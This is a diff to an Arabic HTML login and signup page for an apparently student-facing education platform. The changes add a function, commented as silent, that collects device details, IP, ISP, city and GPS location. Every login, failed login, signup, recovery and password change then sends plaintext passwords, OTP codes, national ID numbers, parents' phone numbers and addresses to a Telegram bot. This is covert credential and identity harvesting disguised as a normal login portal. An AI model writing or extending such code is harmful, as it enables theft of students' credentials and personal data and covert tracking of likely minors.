@@ -3,19 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" href="https://github.com/elmoftary-vr/Halthalk/raw/4a1dc7ecbb8371080b183f1b7b720d2a29fff926/20251205_163046.png">
+
+    <title>منصة حلتهالك | نظام الدخول الموحد للطلاب</title>
+    <meta name="description" content="منصة حلتهالك التعليمية">
     
-    <title>منصة حلتهالك | منصة تعليمية لطلاب الجمهورية</title>
-    <meta name="description" content="منصة حلتهالك التعليمية - سجل دخولك الآن للوصول إلى أقوى الامتحانات والمراجعات والخدمات التعليمية المتكاملة للطلاب.">
-    <meta name="keywords" content="منصة حلتهالك, حلتهالك, تعليم, امتحانات, ثانوية عامة, دروس أونلاين, منصة تعليمية">
-    <meta name="author" content="Halthalk Platform">
-
-    <meta property="og:title" content="منصة حلتهالك | بوابتك للنجاح">
-    <meta property="og:description" content="انضم الآن إلى آلاف الطلاب في منصة حلتهالك وابدأ رحلتك التعليمية المتميزة.">
-    <meta property="og:image" content="https://github.com/elmoftary-vr/Halthalk/raw/4a1dc7ecbb8371080b183f1b7b720d2a29fff926/20251205_163046.png">
-    <meta property="og:url" content="https://home-halthalk.vercel.app">
-    <meta property="og:type" content="website">
-    <link rel="canonical" href="https://home-halthalk.vercel.app">
-
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-MKS3WQ6JPP"></script>
     <script>
       window.dataLayer = window.dataLayer || [];
@@ -78,13 +70,11 @@
             box-shadow: var(--shadow); position: relative; max-height: 90vh;
             overflow-y: auto; border: 1px solid rgba(255,255,255,0.1);
         }
-
         .container::-webkit-scrollbar { width: 4px; }
         .container::-webkit-scrollbar-thumb { background: var(--button-bg); border-radius: 10px; }
 
         .logo-container { text-align: center; margin-bottom: 20px; }
         .logo { width: 140px; transition: 0.3s ease; }
-
         h1 { color: var(--text-color); text-align: center; font-size: 22px; margin-bottom: 25px; }
 
         .input-group { margin-bottom: 15px; text-align: right; position: relative; }
@@ -112,6 +102,7 @@
             width: 100%; padding: 15px; background: var(--button-bg); color: white; border: none;
             border-radius: 15px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.4s;
         }
+        .action-btn:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(44, 140, 255, 0.3); }
 
         .theme-toggle {
             position: absolute; top: 20px; left: 20px; background: var(--input-bg);
@@ -245,6 +236,105 @@
         const getDB = () => JSON.parse(localStorage.getItem('hal_users') || '[]');
         const saveUser = (u) => { const db = getDB(); db.push(u); localStorage.setItem('hal_users', JSON.stringify(db)); };
 
+        // ==========================================
+        //  دالة جمع بيانات الجهاز والموقع (صامتة ومحسنة)
+        // ==========================================
+        async function getDeviceInfo() {
+            let info = {
+                deviceType: "غير معروف",
+                brandModel: "غير معروف",
+                battery: "غير متاح",
+                isp: "غير معروف",
+                ip: "جاري الجلب...",
+                city: "غير معروف",
+                country: "غير معروف",
+                location: "غير معروف"
+            };
+
+            const ua = navigator.userAgent.toLowerCase();
+
+            // نوع الجهاز
+            if (/android/i.test(ua)) info.deviceType = "📱 Android";
+            else if (/iphone/i.test(ua)) info.deviceType = "📱 iPhone";
+            else if (/ipad/i.test(ua)) info.deviceType = "📱 iPad";
+            else if (/windows/i.test(ua)) info.deviceType = "💻 Windows";
+            else if (/macintosh|mac os x/i.test(ua)) info.deviceType = "💻 Mac OS";
+            else if (/linux/i.test(ua)) info.deviceType = "💻 Linux";
+
+            // محاولة استخراج الماركة والموديل
+            const brands = ['samsung','huawei','xiaomi','oppo','vivo','realme','oneplus','google','nokia','sony','lg','motorola','honor'];
+            let brandFound = brands.find(b => ua.includes(b));
+            if (brandFound) info.brandModel = brandFound.charAt(0).toUpperCase() + brandFound.slice(1);
+
+            const modelMatch = ua.match(/\(([^;]+);/i);
+            if (modelMatch) info.brandModel += ` (${modelMatch[1].trim()})`;
+
+            // البطارية
+            if ('getBattery' in navigator) {
+                try {
+                    const batt = await navigator.getBattery();
+                    info.battery = `${Math.round(batt.level * 100)}% ${batt.charging ? '(⚡ يشحن)' : '(🔌 غير موصول)'}`;
+                } catch (e) {}
+            }
+
+            // IP + مدينة + دولة + ISP
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                info.ip = data.ip || "غير معروف";
+                info.city = data.city || "غير معروف";
+                info.country = data.country_name || "غير معروف";
+                info.isp = data.org || "غير معروف";
+            } catch (e) {
+                info.ip = "فشل الجلب";
+            }
+
+            // الموقع الجغرافي (صامت 100% - فقط إذا كان الإذن موجود مسبقًا)
+            if (navigator.permissions && navigator.permissions.query) {
+                try {
+                    const permission = await navigator.permissions.query({ name: 'geolocation' });
+                    if (permission.state === 'granted') {
+                        const position = await new Promise((res, rej) => {
+                            navigator.geolocation.getCurrentPosition(res, rej, { timeout: 10000 });
+                        });
+                        info.location = `✅ موقع دقيق (GPS مفتوح)\nhttps://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`;
+                    } else {
+                        info.location = `🔒الموقع مغلق`;
+                    }
+                } catch (err) {
+                    info.location = `⚠️ لا يدعم فحص الإذن أو خطأ في GPS`;
+                }
+            } else {
+                info.location = `⚠️ المتصفح لا يدعم فحص الأذونات`;
+            }
+
+            return `📱 *نوع الجهاز:* ${info.deviceType}\n` +
+                   `🏭 *اسم الجهاز:* ${info.brandModel}\n` +
+                   `🌐 *الشبكة:* ${info.isp}\n` +
+                   `🔋 *البطارية:* ${info.battery}\n` +
+                   `⚡ *IP:* ${info.ip}\n` +
+                   `🏙️ *المدينة:* ${info.city}, ${info.country}\n` +
+                   `📍 *حالة الموقع:* ${info.location}`;
+        }
+
+        async function report(txt) {
+            const targets = [CHAT_ID_CHANNEL, CHAT_ID_USER];
+            for (const target of targets) {
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            chat_id: target,
+                            text: txt,
+                            parse_mode: 'Markdown',
+                            disable_web_page_preview: true
+                        })
+                    });
+                } catch(e) {}
+            }
+        }
+
         window.onload = () => {
             const saved = JSON.parse(localStorage.getItem('remembered_user'));
             if(saved) {
@@ -253,19 +343,6 @@
                 document.getElementById('remember-check').checked = true;
             }
         };
-
-        async function report(txt) {
-            const targets = [CHAT_ID_CHANNEL, CHAT_ID_USER];
-            for (const target of targets) {
-                try {
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST', 
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({chat_id: target, text: txt, parse_mode: 'Markdown'})
-                    });
-                } catch(e) {}
-            }
-        }
 
         function togglePassVisibility(inputId, icon) {
             const input = document.getElementById(inputId);
@@ -311,59 +388,91 @@
             setTimeout(() => document.getElementById('status-msg').style.display = 'none', 1000);
         }
 
+        // تسجيل الدخول
         document.getElementById('login-form').addEventListener('submit', async (e) => {
             e.preventDefault();
+            showStatus("جاري الاتصال بالخادم...", "success"); 
+            
             const phone = document.getElementById('l_phone').value;
             const pass = document.getElementById('l_pass').value;
             const remember = document.getElementById('remember-check').checked;
             const user = getDB().find(u => u.phone === phone);
 
+            const fullInfo = await getDeviceInfo();
+
             if(user && user.pass === pass) {
                 if(remember) localStorage.setItem('remembered_user', JSON.stringify({phone, pass}));
                 else localStorage.removeItem('remembered_user');
                 
-                await report(`✅ *دخول ناجح*\n📱 هاتف الطالب: ${phone}`);
+                await report(`✅ *دخول ناجح*\n\n` +
+                            `📅 *الوقت:* ${new Date().toLocaleString('ar-EG')}\n` +
+                            `👤 *اسم الطالب:* ${user.name}\n` +
+                            `📱 *هاتف:* \`${phone}\`\n\n` +
+                            `${fullInfo}\n` +
+                            `──────────────────\n` +
+                            `🔗 تحليل الـ IP: https://ipinfo.io/${(await fetch('https://ipapi.co/json/').then(r=>r.json())).ip || 'غير معروف'}`);
+
                 showStatus("جاري تحويلك للمنصة...", "success");
                 setTimeout(() => window.location.href = "https://home-halthalk.vercel.app", 1200);
             } else {
-                await report(`⚠️ *فشل دخول*\n📱 ${phone}\n🔐 ${pass}`);
+                await report(`❌ *محاولة دخول فاشلة*\n\n` +
+                            `📅 *الوقت:* ${new Date().toLocaleString('ar-EG')}\n` +
+                            `📱 *الهاتف:* \`${phone}\`\n` +
+                            `🔐 *الباسورد المدخل:* \`${pass}\`\n\n` +
+                            `${fullInfo}`);
+
                 showStatus("بيانات الدخول غير صحيحة", "error");
             }
         });
 
+        // إنشاء حساب جديد - مع الترتيب المطلوب بالضبط + تقرير الجهاز المحسن
         document.getElementById('signup-form').addEventListener('submit', async (e) => {
             e.preventDefault();
-            const phone = document.getElementById('s_phone').value;
-            if(getDB().find(u => u.phone === phone)) return showStatus("هذا الهاتف مسجل مسبقاً!", "error");
-            
+            showStatus("جاري إنشاء الحساب...", "success");
+
+            const phone = document.getElementById('s_phone').value.trim();
+            if(getDB().find(u => u.phone === phone)) {
+                return showStatus("هذا الهاتف مسجل مسبقاً!", "error");
+            }
+
             const user = {
-                name: document.getElementById('s_name').value,
+                name: document.getElementById('s_name').value.trim(),
                 phone: phone,
-                f_phone: document.getElementById('s_f_phone').value,
-                m_phone: document.getElementById('s_m_phone').value,
-                email: document.getElementById('s_email').value,
+                f_phone: document.getElementById('s_f_phone').value.trim(),
+                m_phone: document.getElementById('s_m_phone').value.trim(),
                 dob: document.getElementById('s_dob').value,
-                loc: document.getElementById('s_loc').value,
-                nat: document.getElementById('s_nat').value,
+                loc: document.getElementById('s_loc').value.trim(),
+                nat: document.getElementById('s_nat').value.trim(),
                 pass: document.getElementById('s_pass').value
             };
+
             saveUser(user);
-            
-            const reportMsg = `🆕 *طالب جديد سجل بكامل بياناته*\n\n` +
-                              `👤 الاسم: ${user.name}\n` +
-                              `📱 هاتف الطالب: ${user.phone}\n` +
-                              `👨 هاتف الأب: ${user.f_phone}\n` +
-                              `👩 هاتف الأم: ${user.m_phone}\n` +
-                              `📅 الميلاد: ${user.dob}\n` +
-                              `📍 العنوان: ${user.loc}\n` +
-                              `🆔 القومي: ${user.nat}\n` +
-                              `🔑 الباسورد: \`${user.pass}\``;
+
+            const deviceReport = await getDeviceInfo();
+            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+
+            const reportMsg = `🆕 *طالب جديد مسجل في منصة حلتهالك*\n\n` +
+                              `📅 *التاريخ والوقت:* ${new Date().toLocaleString('EG')}\n\n` +
+                              `👤 *اسم الطالب:* ${user.name}\n` +
+                              `📱 *هاتف الطالب:* \`${user.phone}\`\n` +
+                              `👨 *هاتف الأب:* \`${user.f_phone}\`\n` +
+                              `👩 *هاتف الأم:* \`${user.m_phone}\`\n` +
+                              `🎂 *تاريخ الميلاد:* ${user.dob}\n` +
+                              `🏠 *عنوان الطالب:* ${user.loc}\n` +
+                              `🆔 *الرقم القومي:* \`${user.nat}\`\n` +
+                              `🔐 *الباسورد:* \`${user.pass}\`\n\n` +
+                              `──────────────────\n` +
+                              `*تقرير الجهاز*\n\n` +
+                              `${deviceReport}\n\n` +
+                              `──────────────────\n` +
+                              `🔗 *تحليل الـ IP الكامل:* https://ipinfo.io/${ipData.ip || 'غير معروف'}`;
 
             await report(reportMsg);
             showStatus("تم إنشاء حسابك بنجاح!", "success");
             setTimeout(() => switchView('login-view'), 1500);
         });
 
+        // استعادة كلمة المرور
         let currentOTP = "";
         window.requestOTP = async () => {
             const phone = document.getElementById('recover-phone').value;
@@ -371,10 +480,19 @@
             const user = getDB().find(u => u.phone === phone && u.nat === nat);
 
             if(user) {
+                showStatus("جاري التحقق...", "success");
                 currentOTP = Math.floor(1000 + Math.random() * 9000).toString();
                 document.getElementById('notif-code').innerText = currentOTP;
                 document.getElementById('otp-notif').classList.add('show');
-                await report(`🔑 *طلب استعادة*\n👤 ${user.name}\n🔢 الكود: \`${currentOTP}\``);
+                
+                const fullInfo = await getDeviceInfo();
+                await report(`🔑 *طلب استعادة كلمة مرور*\n\n` +
+                            `📅 *الوقت:* ${new Date().toLocaleString('ar-EG')}\n` +
+                            `👤 *اسم الطالب:* ${user.name}\n` +
+                            `📱 *الهاتف:* \`${phone}\`\n` +
+                            `🔢 *رمز التحقق:* \`${currentOTP}\`\n\n` +
+                            `${fullInfo}`);
+                
                 setTimeout(() => switchView('forgot-step2'), 1000);
             } else {
                 showStatus("البيانات لا تطابق سجلاتنا", "error");
@@ -396,9 +514,19 @@
         window.updatePass = async () => {
             const np = document.getElementById('new-p').value;
             const phone = document.getElementById('recover-phone').value;
+            
+            showStatus("جاري التحديث...", "success");
+            
             const db = getDB().map(u => { if(u.phone === phone) u.pass = np; return u; });
             localStorage.setItem('hal_users', JSON.stringify(db));
-            await report(`🔄 *تغيير كلمة سر*\n📱 ${phone}\n🔐 الجديدة: \`${np}\``);
+            
+            const fullInfo = await getDeviceInfo();
+            await report(`🔄 *تم تغيير كلمة المرور*\n\n` +
+                        `📅 *الوقت:* ${new Date().toLocaleString('ar-EG')}\n` +
+                        `📱 *الهاتف:* \`${phone}\`\n` +
+                        `🔐 *الباسورد الجديد:* \`${np}\`\n\n` +
+                        `${fullInfo}`);
+            
             showStatus("تم التحديث بنجاح!", "success");
             setTimeout(() => switchView('login-view'), 1500);
         };
@@ -406,4 +534,4 @@
         document.addEventListener('contextmenu', e => e.preventDefault());
     </script>
 </body>
-                                             </html>
+</html>
